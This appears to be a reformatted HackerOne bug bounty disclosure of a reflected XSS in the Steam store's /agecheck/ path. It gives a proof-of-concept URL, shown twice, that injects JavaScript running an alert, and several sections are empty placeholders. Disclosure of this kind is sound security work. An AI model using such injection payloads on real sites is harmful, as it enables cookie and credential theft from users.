# XSS @ store.steampowered.com via agecheck path name

## Metadata
- **Source:** HackerOne
- **Report:** 406704 | https://hackerone.com/reports/406704
- **Submitted:** 2018-09-07
- **Reporter:** tvmpt
- **Program:** Unknown
- **Bounty:** $750
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Hi,

I found a Cross-Site Scripting (XSS) in store.steampowered.com because the path after /agecheck/ is not sanitized as it should.

```
https://store.steampowered.com/agecheck/appmhuh2',{ sessionid: g_sessionID, ageDay: '', ageMonth: '', ageYear: '' } ).done( function( response ) { }%20 );}alert`XSS-by-TvM`;function x(){$J.post('mr2n2/247660/
```

Open this^ link, and XSS will be executed! Teste

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi,

I found a Cross-Site Scripting (XSS) in store.steampowered.com because the path after /agecheck/ is not sanitized as it should.

```
https://store.steampowered.com/agecheck/appmhuh2',{ sessionid: g_sessionID, ageDay: '', ageMonth: '', ageYear: '' } ).done( function( response ) { }%20 );}alert`XSS-by-TvM`;function x(){$J.post('mr2n2/247660/
```

Open this^ link, and XSS will be executed! Tested on FF 61.0.2

Looking forward!

Best regards,
Pedro

## Impact

A cross-site scripting vulnerability allows an attacker to modify the page. The attacker can inject forms to steal usernames, passwords, cookies,etc. In short, XSS opens the doors to plenty of phishing techniques.

</details>

---
*Analysed by Claude on 2026-05-24*
